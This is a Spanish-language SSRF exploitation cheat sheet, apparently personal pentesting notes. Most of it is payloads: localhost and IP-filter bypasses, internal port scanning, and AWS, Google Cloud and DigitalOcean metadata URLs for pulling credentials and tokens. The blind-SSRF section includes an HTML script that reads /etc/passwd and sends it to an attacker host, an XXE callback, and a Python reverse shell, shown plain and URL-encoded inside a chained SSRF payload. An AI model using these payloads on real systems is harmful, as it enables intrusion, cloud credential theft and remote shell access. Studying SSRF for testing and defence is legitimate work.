# Server Side Request Forgery (SSRF)

## Table of contents

- [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [INTRODUCCION](#introduccion)
  - [HERRAMIENTAS](#herramientas)
  - [PAYLOADS](#payloads)
    - [**Todos los filtros vistos en LFI son validos.**](#todos-los-filtros-vistos-en-lfi-son-validos)
  - [EXPLOTACION BASICA](#explotacion-basica)
    - [POC SSRF](#poc-ssrf)
    - [LECTURA DE ARCHIVOS LOCALES](#lectura-de-archivos-locales)
    - [ENUMERACION DE PUERTOS INTERNOS](#enumeracion-de-puertos-internos)
    - [DESCUBRIR DIRECTORIO ACTUAL](#descubrir-directorio-actual)
    - [RCE  ENTER VARIOS SERVIDORES](#rce--enter-varios-servidores)
  - [ESCENARIOS DE ATAQUE](#escenarios-de-ataque)
    - [SSRF CONTRA EL SERVIDOR LOCAL](#ssrf-contra-el-servidor-local)
    - [SSRF CONTRA UN BACKEND](#ssrf-contra-un-backend)
    - [SSRF BLACKLIST INPUT FILTER](#ssrf-blacklist-input-filter)
    - [SSRF + OPEN REDIRECT](#ssrf--open-redirect)
  - [BLIND SSRF](#blind-ssrf)
    - [BURP COLLABORATOR](#burp-collaborator)
    - [BLIND SSRF PAYLOADS](#blind-ssrf-payloads)
    - [BLIND SSRF + SHELLSHOCK](#blind-ssrf--shellshock)
  - [CLOUD](#cloud)
    - [AWS](#aws)
    - [GOOGLE CLOUD](#google-cloud)
    - [DIGITAL OCEAN](#digital-ocean)

## INTRODUCCION

La falsificación de solicitudes del lado del servidor (también conocida como SSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a un dominio arbitrario de la elección del atacante.

En un ataque SSRF típico, el atacante puede hacer que el servidor se conecte a servicios solo internos dentro de la infraestructura de la organización. En otros casos, es posible que puedan obligar al servidor a conectarse a sistemas externos arbitrarios, lo que podría filtrar datos confidenciales, como credenciales de autorización.

En palabras simples podemos realizar peticiones como si el que las hiciera fuera el mismo servidor, esto permite evidar restricciones o acceder a lugares restringidos ya que la peticion aparenta server  mismo servidor (127.0.0.1 o localhost).

La explotación de las vulnerabilidades de SSRF puede conducir a:

-   Interactuar con sistemas internos conocidos
-   Descubrimiento de servicios internos a través de escaneos de puertos
-   Divulgación de datos locales/sensibles
-   Incluir archivos en la aplicación de destino
-   Fugas de hashes de NetNTLM mediante rutas UNC (Windows)
-   Lograr la ejecución remota de código

Por lo general, podemos encontrar vulnerabilidades SSRF en aplicaciones que obtienen recursos remotos. Al buscar vulnerabilidades SSRF, debemos buscar:

-   Partes de solicitudes HTTP, incluidas las URL
-   Importación de archivos como HTML, PDF, imágenes, etc.
-   Conexiones de servidor remoto para obtener datos
-   Importaciones de especificaciones de API
-   Tableros que incluyen ping y funcionalidades similares para verificar los estados del servidor

## HERRAMIENTAS

- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)

## BURPSUITE SCAN

Burpsuite active scan detecta posibles ataques de SSRF y los rporta de la siguiente manera:

![[Pasted image 20230203145437.png]]

## PAYLOADS

Puede que desde un input de la pagina o desde burpsuite tu puedes probar lo siguiente. Enumeracion de puertos internos de la maquina:

```bash
127.0.0.1:1
127.0.0.1:2
127.0.0.1:3
127.0.0.1:4
127.0.0.1:5
...
127.0.0.1:<port>
```

Puedes hacer un ataque de fuerza bruta con burpsuite mediante el intruder.

Otra forma

```bash
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22

http://localhost:80
http://localhost:443
http://localhost:22
```

Bypass using HTTPS

```bash
https://127.0.0.1/
https://localhost/
```

Bypass localhost with [::]

```bash
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid


http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

Bypass using a decimal IP location

```bash
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254
```

Uso de IPv6

```bash
http://[0:0:0:0:0:ffff:127.0.0.1]
```

A veces tu puedes acceder a iertas rutas de la pagina restringidas como /admin, esto tambien en APIRestful:

```bash
http://127.0.0.1/admin
http://127.0.0.1/user/add


# URL encoding
http://127.0.0.1/%61dmin
# Doble URL encoding
http://127.0.0.1/%2561dmin
```

bypass blacklist IP:

```bash
http://127.1/
```

### **Todos los filtros vistos en LFI son validos.**

A veces se puede probar en la url.

```bash
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

## EXPLOTACION BASICA

### POC SSRF

Imaginemos que encontramos una pagina como esta:

![[Pasted image 20230107215556.png]]

a traves de la variable GET `q` parece que carga contenido HTML, este es un vector para probar si el parametro es vulnerable a SSRF.

>[!tip]
>Tenga en cuenta que obtener archivos HTML remotos puede conducir a Reflected XSS.

Nos colocamos en escucha por netcat y colocamos nuestra IP en la variable:

```bash
nc -lvnp 4545
```

![[Pasted image 20230107215909.png]]

tenemos una respuesta:

![[Pasted image 20230107215932.png]]

podemos ver en la respuesta que el servidor web esta usando la libreria de python **urllib** para realizar la paticion contra nosotros.

### LECTURA DE ARCHIVOS LOCALES

![[Pasted image 20230107220312.png]]

### ENUMERACION DE PUERTOS INTERNOS

Recuerde, solo tenemos dos puertos abiertos en el servidor de destino. Sin embargo, existe la posibilidad de que existan aplicaciones internas y escuchen solo en localhost. Podemos con Burpsuite intruder enumerar puertos locales:

```bash
?q=http://127.0.0.1:1
?q=http://127.0.0.1:2
?q=http://127.0.0.1:3
...
```

del 1 al 65535 (o puede ser menos)

![[Pasted image 20230107220759.png]]

encontro 2 puertos:

el puerto 80 no indica en la respuesta DNS de aplicaciones internas en otro servidor:

![[Pasted image 20230107221107.png]]

el puerto 5000 es una aplicacion web que corre internamente:

![[Pasted image 20230107221126.png]]

### DESCUBRIR DIRECTORIO ACTUAL

Podemos ver en que directorio nos encontramos mediante las variable de entorno `PWD` (en caso de estar configurada).

Podemos acceder a las variables de entorno consultando `/proc/self/environ`:

![[Pasted image 20230107222038.png]]

>[!tip]
>ademas es posible enumerar mas informacion con las variables de entorno y otras rutas del /Proc

### RCE  ENTER VARIOS SERVIDORES

Es posible que a traves de un SSRF lleguemos a un aplicaicon interna y de esa aplicacion interna lleguemos a otra aplicacion interna mediante otro SSRF y esta ultima aplicacion sea vulnerable a RCE:

```bash
[WEB APP 1 SSRF] --> [WEB APP INTERNA 1 SSRF] --> [WEB APP INTERNA 2 RCE]
```

>[!tip]
>Para la ejecucion de comandos en el ultimo host es posible que debamos codificarlos tres veces el comando en URL Encoded mientras los pasamos a través de tres aplicaciones web diferentes.

## ESCENARIOS DE ATAQUE

### SSRF CONTRA EL SERVIDOR LOCAL

Si vemos que algun parametro ofuncion esta llamando a una URL, podemos intentar ver una ruta del servidor local a la que no tenemos acceso:

![[Pasted image 20220930113840.png]]

llamamos a una ruta que no tenemos acceso del servidor local:

```bash
#todas las posible rutas funcionarian

http://localhost/admin
http://localhost/admin/delete?name=carlos
```

![[Pasted image 20220930114006.png]]

![[Pasted image 20220930114021.png]]

### SSRF CONTRA UN BACKEND

Podemos realizar enumeracion de servidores:

![[Pasted image 20220930121113.png]]

![[Pasted image 20220930121131.png]]

### SSRF BLACKLIST INPUT FILTER

A veces tu puedes acceder a iertas rutas de la pagina restringidas como /admin, esto tambien en APIRestful:

```bash
http://127.0.0.1/admin
http://127.0.0.1/user/add


# URL encoding
http://127.0.0.1/%61dmin
# Doble URL encoding
http://127.0.0.1/%2561dmin
```

bypass blacklist IP:

```bash
http://127.1/
```

### SSRF + OPEN REDIRECT

De encontrar un open redirect, podemos validar en llamar una ruta de un servidor local:

open redirect en path variable:

![[Pasted image 20220930161212.png]]

## BLIND SSRF 

Las vulnerabilidades de falsificación de solicitudes del lado del servidor pueden ser "ciegas". En estos casos, aunque se procese la solicitud, no podemos ver la respuesta del servidor backend. Por esta razón, las vulnerabilidades SSRF ciegas son más difíciles de detectar y explotar.

Podemos detectar vulnerabilidades SSRF ciegas a través de técnicas fuera de banda, lo que hace que el servidor emita una solicitud a un servicio externo bajo nuestro control. Para detectar si un servicio de back-end está procesando nuestras solicitudes, podemos usar un servidor con una dirección IP pública de nuestra propiedad o servicios como:

-   [Colaborador de Burp](https://portswigger.net/burp/documentation/collaborator) (parte de Burp Suite profesional. No disponible en la edición comunitaria)
-   http://pingb.in (probar si se recibe el ping sino recargar la pagina y generar otro server luego intentar nuevamente)

>[!note]
>Ejemplo de uso de pingb.in [https://infosecwriteups.com/a-simple-dns-oob-exfil-solution-or-pingb-in-life-hack-45e6aa44fc49](https://infosecwriteups.com/a-simple-dns-oob-exfil-solution-or-pingb-in-life-hack-45e6aa44fc49)

**y en ocaciones de estar en una red local podemos usar netcat o python http-server.**

### BURP COLLABORATOR

Podemos intentar modificar el header referer para probar esta vulnerabilidad:

Usando burp collaborator:

![[Pasted image 20220930161939.png]]

![[Pasted image 20220930162010.png]]

### BLIND SSRF PAYLOADS

Dependera de que tipo de archivo el sistema permite cargar:

FILE UPLOAD - SVG

- [https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)

XML

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://pingb.in/p/1b714045017992c0db9294a442a5">]>
<foo>&xxe;</foo>
```

HTML

```html
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

HTML + XMLHttpRequest

```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```



HTML + Python Rverse shell

>[!note]
>Esto se utiliza siempre y cuando:
>- la pagina principal es vulnerable a SSRF.
>- La pagina interna es vulnerable a RCE.
>- El servidor interno interpreta Python.

```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

# en base64
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```

```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

- pagina principal: http://internal.app.local/load?q
- pagina interna: http::////127.0.0.1:5000/runme?x

>[!tip]
>No ovidemos codiicar la carga en URLencoded una vez por acda host que atravesemos

URL:

```http
http://<SERVICE IP>:PORT/x?=viaimgtag
```

EJEMPLOS BUG BOUNTY

- [https://www.youtube.com/watch?v=WiJfG4Ch8p8](https://www.youtube.com/watch?v=WiJfG4Ch8p8)

FILE UPLOAD + SSRF

- [https://www.youtube.com/watch?v=ICd_bOLMYZQ](https://www.youtube.com/watch?v=ICd_bOLMYZQ)

### BLIND SSRF + SHELLSHOCK




## CLOUD

En caso de encontrar un SSRF en la nube, existen algunos recursos interesantes:


### AWS

```bash
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Si tiene una SSRF con acceso al sistema de archivos en una instancia de ECS, intente extraer **/proc/self/environ** para obtener UUID.

```bash
curl http://169.254.170.2/v2/credentials/<UUID>
```

para AWS con Elastik Beanstalk

```bash
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

### GOOGLE CLOUD

Requiere el header "Metadata-Flavor: Google" o "X-Google-Metadata-Request: True"

```bash
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Interesting files to pull out:

-   SSH Public Key `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
-   Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
-   Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

### DIGITAL OCEAN

```bash
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq

```

Para mas informacion:

[SSRF]](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

